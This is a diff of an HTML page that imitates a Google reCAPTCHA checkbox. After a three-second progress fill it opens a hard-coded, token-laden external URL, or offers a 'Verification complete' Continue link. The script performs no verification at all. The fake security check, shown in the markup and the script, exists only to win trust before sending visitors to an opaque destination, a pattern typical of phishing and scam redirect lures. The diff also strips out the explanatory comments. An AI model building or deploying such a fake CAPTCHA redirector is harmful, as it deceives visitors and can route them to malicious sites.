@@ -7,8 +7,14 @@
   <meta name="description" content="Single button that becomes a reCAPTCHA-style box, then shows a loading fill and redirects." />
   <style>
     :root{
-      --text:#2d3748; --accent:#2563eb; --accent-hover:#1d4ed8;
-      --border:#e4e4e4; --box:#cfd8dc; --check:#10b981; --bar:#60a5fa;
+      --text:#e5e7eb;              /* better contrast on dark hosts */
+      --accent:#60a5fa;            /* blue-400 */
+      --accent-hover:#93c5fd;      /* blue-300 */
+      --border:#2b3544;            /* subtle on dark */
+      --box:#cfd8dc;
+      --check:#10b981;
+      --bar:rgba(96,165,250,.35);  /* lighter fill on dark */
+      --focus:rgba(96,165,250,.45);/* custom focus ring */
     }
     html,body{height:100%}
     body{
@@ -18,32 +24,44 @@
     }
     .wrap{ width:min(360px,96vw); }
 
+    /* ===== Button ===== */
     #action{
       position:relative; width:100%;
       display:inline-flex; align-items:center; justify-content:center; gap:.6rem;
-      padding:.85em 1.15em; border-radius:24px;
-      background:transparent; color:var(--accent); border:2px solid currentColor;
-      font-weight:700; font-size:1rem; line-height:1.2;
+      padding:.95em 1.25em; border-radius:999px;
+      background:transparent; color:var(--accent);
+      border:2px solid currentColor;
+      font-weight:800; font-size:1.05rem; line-height:1.2;
       cursor:pointer; user-select:none; overflow:hidden;
-      transition: color .18s, border-color .18s, border-radius .22s, padding .22s;
+      transition: color .18s, border-color .18s, border-radius .22s, padding .22s, box-shadow .18s;
     }
     #action:hover{ color:var(--accent-hover); border-color:var(--accent-hover) }
     #action:disabled{ opacity:.9; cursor:not-allowed }
+
+    /* ==== FOCUS STYLE FIX ==== */
+    #action:focus{ outline: none; }
+    /* Option A: soft glow */
+    #action:focus-visible{ outline: none; box-shadow: 0 0 0 3px var(--focus); }
+    /* If you want NO ring at all, comment Option A above and uncomment below */
+    /* #action:focus-visible{ outline: none; box-shadow:none; } */
+    /* ======================== */
+
     #action .label{ position:relative; z-index:2; white-space:nowrap }
 
-    /* progress fill */
+    /* Progress fill */
     #action .bar{
       position:absolute; left:0; top:0; height:100%; width:0;
-      background:var(--bar); opacity:.28; z-index:1; pointer-events:none;
+      background:var(--bar); z-index:1; pointer-events:none; opacity:1;
+      will-change: width; transform: translateZ(0);
     }
     @keyframes fill3s{ from{width:0%} to{width:100%} }
 
-    /* recaptcha look */
+    /* reCAPTCHA look */
     #action .recaptcha{ display:none; width:100% }
-    #action.captcha{ border:0; padding:0; border-radius:8px }
+    #action.captcha{ border:0; padding:0; border-radius:12px }
     #action.captcha .recaptcha{
-      display:block; background:#fff; border:1px solid var(--border);
-      border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.06);
+      display:block; background:#fff; border:1px solid var(--border); border-radius:12px;
+      box-shadow:0 2px 10px rgba(0,0,0,.25);
     }
     .rc-row{ display:flex; align-items:center; justify-content:space-between; padding:12px 14px 8px 12px }
     .rc-left{ display:flex; align-items:center; gap:12px }
@@ -71,16 +89,17 @@
     #action.idle .recaptcha{ display:none }
     #action.captcha .label{ display:none }
 
-    #action.loading{ border:2px solid var(--accent); color:var(--accent); border-radius:24px; padding:.85em 1.15em }
+    #action.loading{
+      border-color:var(--accent); color:var(--accent);
+      border-radius:999px; padding:.95em 1.25em;
+    }
     #action.loading .label{ display:block }
     #action.loading .recaptcha{ display:none }
     #action.loading .bar{ animation:fill3s 3s linear forwards }
 
-    .hint{ margin-top:.6rem; text-align:center; color:#888; font-size:.92rem }
-    .continue{ display:none; margin-top:.5rem; text-align:center }
-    .continue a{
-      font-weight:700; color:var(--accent); text-decoration:none;
-    }
+    .hint{ margin-top:.65rem; text-align:center; color:#9aa3b2; font-size:.95rem }
+    .continue{ display:none; margin-top:.55rem; text-align:center }
+    .continue a{ font-weight:800; color:var(--accent); text-decoration:none }
     .continue a:hover{ color:var(--accent-hover); text-decoration:underline }
   </style>
 </head>
@@ -113,7 +132,6 @@
   </div>
 
   <script>
-    // Your redirect URL:
     const DEST_URL = "https://6us.org/?27qX8fFg3NxUDhCju3K2HCDm2h8FXsZiAbTI5VXJkyqV3oXEqhbpW";
 
     const btn  = document.getElementById('action');
@@ -123,7 +141,7 @@
     const continueWrap = document.getElementById('continue');
     const continueLink = document.getElementById('continueLink');
 
-    let state = 'idle'; // 'idle' -> 'captcha' -> 'loading'
+    let state = 'idle';
 
     function toCaptcha(){
       state = 'captcha';
@@ -144,34 +162,27 @@
       rcBox.setAttribute('aria-checked','true');
       hint.textContent = "Please wait ~3 seconds…";
 
-      // Only redirect AFTER the progress animation finishes
+      // Redirect AFTER the fill completes
       const onDone = () => {
-        // Try to open in a new tab/window now (after verification completes)
         const w = window.open(DEST_URL, "_blank", "noopener");
         if (!w) {
-          // Popup blocked: show a manual continue link
           continueLink.href = DEST_URL;
           continueWrap.style.display = "block";
           hint.textContent = "Verification complete. Tap Continue to open your page.";
-        } else {
-          try { w.opener = null; } catch(e) {}
         }
       };
       bar.addEventListener('animationend', onDone, { once: true });
     }
 
-    // First click: show captcha
     btn.addEventListener('click', () => {
       if (state === 'idle') toCaptcha();
     });
 
-    // Only the small checkbox starts loading
     rcBox.addEventListener('click', (e) => {
       e.stopPropagation();
       if (state === 'captcha') toLoading();
     });
 
-    // Keyboard support for the checkbox
     rcBox.addEventListener('keydown', (e) => {
       if (state === 'captcha' && (e.key === ' ' || e.key === 'Enter')) {
         e.preventDefault();
@@ -179,7 +190,6 @@
       }
     });
 
-    // Prevent Enter/Space on whole button while in captcha state
     btn.addEventListener('keydown', (e) => {
       if ((e.key === ' ' || e.key === 'Enter') && state === 'captcha') {
         e.preventDefault();
